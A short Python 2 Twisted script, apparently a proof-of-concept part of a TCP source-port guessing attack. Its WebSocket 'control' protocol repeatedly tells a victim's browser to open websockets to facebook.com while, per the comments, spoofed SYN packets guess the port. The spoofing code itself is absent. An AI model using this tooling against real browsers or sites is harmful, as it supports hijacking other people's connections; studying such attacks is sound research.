#!/usr/bin/python

# Modified from https://github.com/gtaylor/txWS-example-project/blob/master/src/protocols/websockets.py

from twisted.internet import reactor
from twisted.internet.protocol import Factory, Protocol
from twisted.python import log

class WebSocketServerFactory(Factory):
    """
    This is used by twisted.internet.TCPServer to create TCP Servers for each
    port the server listens on.
    """
    def __init__(self, service):
        """
        :attr WebSocketService service: Reference to the top-level service.
        :attr EchoUpper protocol: The protocol this factor spawns.
        """
        self.service = service
        self.protocol = ControlWebSocket
        print "setup websocketserverfactory"


class ControlWebSocket(Protocol):
    """
    The control_sock in page.html - here we issue new commands to the browser,
    such as "make a new websocket to site.com", while we spoof SYN packets from site.com
    to guess the source port the client picked.
    """

    def fireAgain(self):
        """
        start constructing and spewing syn packets to victim
        """
        print "firing"
        self.transport.write("make ws://facebook.com/") 

    def dataReceived(self, data):
        print "got data"
        log.msg("Got %r" % (data,))
        if data == 'closed':
            reactor.callLater(0.2, self.fireAgain)
        #self.transport.write(data.upper())

    def connectionMade(self):
        self.fireAgain()
